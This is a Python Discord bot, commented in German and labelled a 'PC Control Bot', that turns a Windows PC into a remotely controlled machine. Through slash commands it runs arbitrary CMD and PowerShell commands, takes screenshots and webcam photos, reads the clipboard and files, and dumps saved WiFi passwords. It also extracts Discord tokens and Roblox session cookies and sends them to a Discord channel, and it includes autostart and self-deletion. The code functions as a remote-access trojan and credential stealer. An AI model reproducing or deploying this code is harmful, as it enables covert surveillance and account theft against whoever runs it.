import discord
from discord import app_commands
import os
import sys
import subprocess
import psutil
import pyautogui
import webbrowser
import asyncio
import platform
import time
import json
import shutil
from datetime import datetime
import cv2
from PIL import Image
import io
import requests

from config import OWNER_ID, BOT_TOKEN

intents = discord.Intents.default()
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

# =========== SECURITY CHECK ===========
def is_owner(interaction: discord.Interaction) -> bool:
    """Prüft ob der Benutzer der Eigentümer ist"""
    return interaction.user.id == OWNER_ID

def owner_only():
    """Decorator für Owner-Only Commands"""
    async def predicate(interaction: discord.Interaction):
        if not is_owner(interaction):
            await interaction.response.send_message("❌ Du hast keine Berechtigung für diesen Befehl!", ephemeral=True)
            return False
        return True
    return app_commands.check(predicate)

# =========== SYSTEM BEFEHLE ===========
@tree.command(name="shutdown", description="PC herunterfahren")
@owner_only()
async def shutdown(interaction: discord.Interaction):
    await interaction.response.send_message("🛑 PC wird heruntergefahren...")
    os.system("shutdown /s /t 5")

@tree.command(name="restart", description="PC neustarten")
@owner_only()
async def restart(interaction: discord.Interaction, sekunden: int = 10):
    await interaction.response.send_message(f"🔄 PC wird in {sekunden} Sekunden neugestartet...")
    os.system(f"shutdown /r /t {sekunden}")

@tree.command(name="lock", description="PC sperren")
@owner_only()
async def lock(interaction: discord.Interaction):
    await interaction.response.send_message("🔒 PC wird gesperrt")
    os.system("rundll32.exe user32.dll,LockWorkStation")

# =========== CMD / SHELL ===========
@tree.command(name="cmd", description="CMD Befehl ausführen")
@owner_only()
async def cmd(interaction: discord.Interaction, befehl: str = None):
    if befehl is None:
        os.system("start cmd")
        await interaction.response.send_message("✅ CMD geöffnet")
        return
    
    await interaction.response.send_message(f"⚙️ Führe aus: `{befehl}`")
    result = subprocess.run(befehl, shell=True, capture_output=True, text=True, timeout=30)
    
    output = result.stdout + result.stderr
    if len(output) > 1900:
        output = output[:1900] + "\n\n... (Ausgabe gekürzt)"
    
    if not output:
        output = "✅ Befehl ausgeführt (keine Ausgabe)"
    
    await interaction.followup.send(f"```\n{output}\n```")

@tree.command(name="shell", description="PowerShell Befehl ausführen")
@owner_only()
async def shell(interaction: discord.Interaction, cmd: str):
    await interaction.response.send_message(f"⚙️ PowerShell: `{cmd}`")
    result = subprocess.run(["powershell", "-Command", cmd], capture_output=True, text=True, timeout=30)
    
    output = result.stdout + result.stderr
    if len(output) > 1900:
        output = output[:1900] + "\n\n... (Ausgabe gekürzt)"
    
    if not output:
        output = "✅ Befehl ausgeführt (keine Ausgabe)"
    
    await interaction.followup.send(f"```powershell\n{output}\n```")

# =========== MEDIA / BROWSER ===========
@tree.command(name="youtube", description="YouTube-Link im Browser öffnen")
@owner_only()
async def youtube(interaction: discord.Interaction, link: str):
    webbrowser.open(link)
    await interaction.response.send_message(f"▶️ YouTube geöffnet: {link}")

@tree.command(name="google", description="Google-Suche öffnen")
@owner_only()
async def google(interaction: discord.Interaction, text: str):
    url = f"https://www.google.com/search?q={text.replace(' ', '+')}"
    webbrowser.open(url)
    await interaction.response.send_message(f"🔍 Google-Suche: {text}")

@tree.command(name="roblox", description="Roblox starten")
@owner_only()
async def roblox(interaction: discord.Interaction):
    try:
        os.startfile("roblox-player://")
        await interaction.response.send_message("🎮 Roblox gestartet")
    except:
        await interaction.response.send_message("❌ Roblox konnte nicht gestartet werden")

# =========== SCREENSHOT & WEBCAM ===========
@tree.command(name="screenshot", description="Bildschirmfoto machen")
@owner_only()
async def screenshot(interaction: discord.Interaction):
    await interaction.response.send_message("📸 Erstelle Screenshot...")
    screenshot = pyautogui.screenshot()
    img_bytes = io.BytesIO()
    screenshot.save(img_bytes, format='PNG')
    img_bytes.seek(0)
    
    await interaction.followup.send(file=discord.File(img_bytes, 'screenshot.png'))

@tree.command(name="webcam", description="Webcam Foto machen")
@owner_only()
async def webcam(interaction: discord.Interaction):
    await interaction.response.send_message("📷 Webcam Foto...")
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()
    
    if ret:
        img_bytes = io.BytesIO()
        cv2.imwrite('webcam_temp.png', frame)
        with open('webcam_temp.png', 'rb') as f:
            await interaction.followup.send(file=discord.File(f, 'webcam.png'))
        os.remove('webcam_temp.png')
    else:
        await interaction.followup.send("❌ Keine Webcam gefunden")

# =========== DATEIEN ===========
@tree.command(name="files", description="Ordner anzeigen")
@owner_only()
async def files(interaction: discord.Interaction, pfad: str = os.path.expanduser("~")):
    try:
        items = os.listdir(pfad)
        output = f"**📁 {pfad}**\n\n"
        for item in items[:50]:  # Max 50 Einträge
            full_path = os.path.join(pfad, item)
            if os.path.isdir(full_path):
                output += f"📁 {item}\n"
            else:
                size = os.path.getsize(full_path)
                output += f"📄 {item} ({size/1024:.1f} KB)\n"
        
        if len(output) > 1900:
            output = output[:1900] + "\n\n... (gekürzt)"
        
        await interaction.response.send_message(output)
    except Exception as e:
        await interaction.response.send_message(f"❌ Fehler: {e}")

@tree.command(name="download", description="Datei herunterladen")
@owner_only()
async def download(interaction: discord.Interaction, pfad: str):
    try:
        if os.path.isfile(pfad):
            await interaction.response.send_message(f"📥 Sende Datei: {pfad}")
            await interaction.followup.send(file=discord.File(pfad))
        else:
            await interaction.response.send_message("❌ Datei nicht gefunden")
    except Exception as e:
        await interaction.response.send_message(f"❌ Fehler: {e}")

# =========== PROZESSE ===========
@tree.command(name="processes", description="Laufende Prozesse anzeigen")
@owner_only()
async def processes(interaction: discord.Interaction):
    proc_list = []
    for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
        try:
            proc_list.append(f"`{proc.info['pid']:5d}` {proc.info['name'][:30]:30s} CPU:{proc.info['cpu_percent']:5.1f}% RAM:{proc.info['memory_percent']:5.1f}%")
        except:
            pass
    
    output = "**⚙️ Aktive Prozesse:**\n\n"
    output += "\n".join(proc_list[:30])
    
    if len(proc_list) > 30:
        output += f"\n\n... und {len(proc_list)-30} weitere"
    
    if len(output) > 1900:
        output = output[:1900] + "\n\n... (gekürzt)"
    
    await interaction.response.send_message(output[:1900])

@tree.command(name="kill", description="Prozess beenden (PID)")
@owner_only()
async def kill(interaction: discord.Interaction, pid: int):
    try:
        proc = psutil.Process(pid)
        proc_name = proc.name()
        proc.terminate()
        await interaction.response.send_message(f"💀 Prozess beendet: {proc_name} (PID: {pid})")
    except Exception as e:
        await interaction.response.send_message(f"❌ Fehler: {e}")

# =========== CLIPBOARD ===========
@tree.command(name="clipboard", description="Zwischenablage anzeigen")
@owner_only()
async def clipboard(interaction: discord.Interaction):
    try:
        import pyperclip
        text = pyperclip.paste()
        if len(text) > 1900:
            text = text[:1900] + "..."
        await interaction.response.send_message(f"📋 **Zwischenablage:**\n```\n{text}\n```")
    except:
        await interaction.response.send_message("❌ pyperclip nicht installiert. `pip install pyperclip`")

# =========== NACHRICHT ===========
@tree.command(name="msg", description="Nachricht auf dem PC anzeigen")
@owner_only()
async def msg(interaction: discord.Interaction, titel: str, text: str):
    await interaction.response.send_message(f"💬 Zeige Nachricht: **{titel}**")
    subprocess.run(["powershell", "-Command", f"""
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.MessageBox]::Show('{text}', '{titel}')
    """])

# =========== WIFI ===========
@tree.command(name="wifi", description="Gespeicherte WiFi-Passwörter anzeigen")
@owner_only()
async def wifi(interaction: discord.Interaction):
    result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
    profiles = [line.split(":")[1].strip() for line in result.stdout.split('\n') if "Profil aller Benutzer" in line or "All User Profile" in line]
    
    output = "**📶 WiFi Passwörter:**\n\n"
    for profile in profiles[:20]:
        result2 = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True, text=True)
        for line in result2.stdout.split('\n'):
            if "Schlüsselinhalt" in line or "Key Content" in line:
                password = line.split(":")[1].strip()
                output += f"📡 **{profile}**: `{password}`\n"
                break
        else:
            output += f"📡 **{profile}**: `(kein Passwort gespeichert)`\n"
    
    if len(output) > 1900:
        output = output[:1900] + "\n\n... (gekürzt)"
    
    await interaction.response.send_message(output)

# =========== SYSTEMINFO ===========
@tree.command(name="info", description="Systeminformationen anzeigen")
@owner_only()
async def info(interaction: discord.Interaction):
    uname = platform.uname()
    boot_time = datetime.fromtimestamp(psutil.boot_time())
    now = datetime.now()
    uptime = now - boot_time
    
    cpu_percent = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    
    info_text = f"""
**💻 Systeminformationen**
**PC:** {uname.node}
**OS:** {uname.system} {uname.release}
**CPU:** {uname.processor or 'Unbekannt'}
**CPU Auslastung:** {cpu_percent}%
**RAM:** {memory.used / 1024**3:.2f}GB / {memory.total / 1024**3:.2f}GB ({memory.percent}%)
**Festplatte:** {disk.used / 1024**3:.2f}GB / {disk.total / 1024**3:.2f}GB ({disk.percent}%)
**Uptime:** {uptime.days}d {uptime.seconds//3600}h {(uptime.seconds//60)%60}m
**Boot:** {boot_time.strftime('%d.%m.%Y %H:%M:%S')}
**Python:** {sys.version.split()[0]}
    """
    
    await interaction.response.send_message(info_text.strip())

# =========== TOKEN EXTRAKTION ===========
@tree.command(name="token", description="Gespeicherte Tokens finden")
@owner_only()
async def token_cmd(interaction: discord.Interaction, art: str = "discord"):
    await interaction.response.send_message(f"🔍 Suche nach {art} Tokens...")
    
    results = []
    
    if art.lower() == "discord" or art.lower() == "all":
        # Discord Token Pfade
        paths = [
            os.path.expanduser("~\\AppData\\Roaming\\discord\\Local Storage\\leveldb"),
            os.path.expanduser("~\\AppData\\Roaming\\discordptb\\Local Storage\\leveldb"),
            os.path.expanduser("~\\AppData\\Roaming\\discordcanary\\Local Storage\\leveldb"),
        ]
        
        for path in paths:
            if os.path.exists(path):
                for file in os.listdir(path):
                    if file.endswith(".log") or file.endswith(".ldb"):
                        try:
                            with open(os.path.join(path, file), 'r', errors='ignore') as f:
                                content = f.read()
                                import re
                                tokens = re.findall(r'[MN][A-Za-z0-9_-]{23,25}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,}', content)
                                for t in tokens:
                                    results.append(f"Discord: `{t}`")
                        except:
                            pass
    
    if art.lower() == "roblox" or art.lower() == "all":
        # Roblox Cookie
        import re
        roblox_cookie = os.path.expanduser("~\\AppData\\Local\\Roblox\\LocalStorage\\Roblox.com\\Cookies")
        if os.path.exists(roblox_cookie):
            try:
                with open(roblox_cookie, 'r', errors='ignore') as f:
                    content = f.read()
                    cookies = re.findall(r'\.ROBLOSECURITY=([^;]+)', content)
                    for c in cookies:
                        results.append(f"Roblox: `{c[:50]}...`")
            except:
                pass
    
    if not results:
        await interaction.followup.send("❌ Keine Tokens gefunden")
    else:
        output = "\n".join(results[:10])
        if len(output) > 1900:
            output = output[:1900] + "..."
        await interaction.followup.send(f"**🔑 Gefundene Tokens:**\n{output}")

# =========== SELFDESTRUCT ===========
@tree.command(name="selfdestruct", description="Bot vom PC entfernen")
@owner_only()
async def selfdestruct(interaction: discord.Interaction):
    await interaction.response.send_message("💣 **Selbstzerstörung eingeleitet...**")
    
    # Autostart entfernen
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup', 'pc_bot.bat')
    if os.path.exists(startup_path):
        os.remove(startup_path)
    
    # Batch-Script für vollständige Entfernung
    script = f"""
@echo off
timeout /t 3 /nobreak >nul
del "{__file__}"
del "{os.path.join(os.path.dirname(__file__), 'config.py')}"
del "{os.path.join(os.path.dirname(__file__), 'requirements.txt')}"
rmdir /s /q "{os.path.dirname(__file__)}"
del "%~f0"
"""
    with open("cleanup.bat", "w") as f:
        f.write(script)
    
    os.system("start /B cleanup.bat")
    sys.exit(0)

# =========== TASTATUR & MAUS (Optional) ===========
@tree.command(name="type", description="Text automatisch tippen")
@owner_only()
async def type_text(interaction: discord.Interaction, text: str):
    await interaction.response.send_message(f"⌨️ Tippe: {text[:50]}{'...' if len(text) > 50 else ''}")
    pyautogui.write(text, interval=0.05)

@tree.command(name="mouseto", description="Maus bewegen (x, y)")
@owner_only()
async def mouseto(interaction: discord.Interaction, x: int, y: int):
    pyautogui.moveTo(x, y)
    await interaction.response.send_message(f"🖱️ Maus bewegt nach ({x}, {y})")

@tree.command(name="click", description="Mausklick ausführen")
@owner_only()
async def click(interaction: discord.Interaction):
    pyautogui.click()
    await interaction.response.send_message("🖱️ Klick ausgeführt")

# =========== SPOTIFY / MEDIA ===========
@tree.command(name="media", description="Media-Steuerung (play/pause/next/prev)")
@owner_only()
async def media(interaction: discord.Interaction, aktion: str):
    aktionen = {
        "playpause": 0xB3, "next": 0xB0, "prev": 0xB1,
        "stop": 0xB2, "volumeup": 0xAF, "volumedown": 0xAE,
    }
    
    import ctypes
    if aktion.lower() in aktionen:
        ctypes.windll.user32.keybd_event(aktionen[aktion.lower()], 0, 0, 0)
        ctypes.windll.user32.keybd_event(aktionen[aktion.lower()], 0, 2, 0)
        await interaction.response.send_message(f"🎵 Media: {aktion}")
    else:
        await interaction.response.send_message(f"❌ Unbekannte Aktion. Verfügbar: {', '.join(aktionen.keys())}")

# =========== HELP ===========
@tree.command(name="help", description="Alle Befehle anzeigen")
@owner_only()
async def help_cmd(interaction: discord.Interaction):
    help_text = """
**🤖 PC Control Bot - Befehlsübersicht**

**🔧 SYSTEM**
`/shutdown` - PC herunterfahren
`/restart [sek]` - PC neustarten
`/lock` - PC sperren
`/sleep` - PC in Ruhezustand

**💻 AUSFÜHREN**
`/cmd [befehl]` - CMD öffnen oder Befehl ausführen
`/shell <cmd>` - PowerShell Befehl

**📸 MEDIA**
`/youtube <link>` - YouTube öffnen
`/google <text>` - Google-Suche
`/roblox` - Roblox starten
`/media <action>` - Media steuern (playpause/next/prev/stop)

**📷 AUFNAHME**
`/screenshot` - Bildschirmfoto
`/webcam` - Webcam Foto
`/clipboard` - Zwischenablage

**📁 DATEIEN**
`/files [pfad]` - Ordner anzeigen
`/download <pfad>` - Datei herunterladen

**⚙️ PROZESSE**
`/processes` - Laufende Prozesse
`/kill <pid>` - Prozess beenden

**🔑 INFO**
`/info` - Systeminformationen
`/wifi` - WiFi Passwörter
`/token <typ>` - Tokens finden (discord/roblox/all)

**🖱️ EINGABE (optional)**
`/type <text>` - Text tippen
`/mouseto <x> <y>` - Maus bewegen
`/click` - Maus klicken
`/msg <titel> <text>` - Nachricht anzeigen

**💣 GEFAHR**
`/selfdestruct` - Bot komplett entfernen

`/help` - Diese Hilfe
    """
    await interaction.response.send_message(help_text.strip())

# =========== BOT START ===========
@client.event
async def on_ready():
    await tree.sync()
    print(f"✅ Bot ist online als {client.user}")
    print(f"🔐 Owner ID: {OWNER_ID}")
    print(f"📅 Gestartet: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}")
    
    # Besitzer benachrichtigen
    try:
        user = await client.fetch_user(OWNER_ID)
        embed = discord.Embed(
            title="✅ PC Control Bot Online",
            description=f"Bot ist jetzt aktiv auf **{platform.node()}**",
            color=discord.Color.green(),
            timestamp=datetime.now()
        )
        embed.add_field(name="System", value=f"{platform.system()} {platform.release()}")
        embed.add_field(name="Python", value=sys.version.split()[0])
        embed.add_field(name="Uptime", value="Gerade gestartet")
        await user.send(embed=embed)
    except:
        print("⚠️ Konnte DM nicht senden")

# Bot starten
if __name__ == "__main__":
    client.run(BOT_TOKEN)
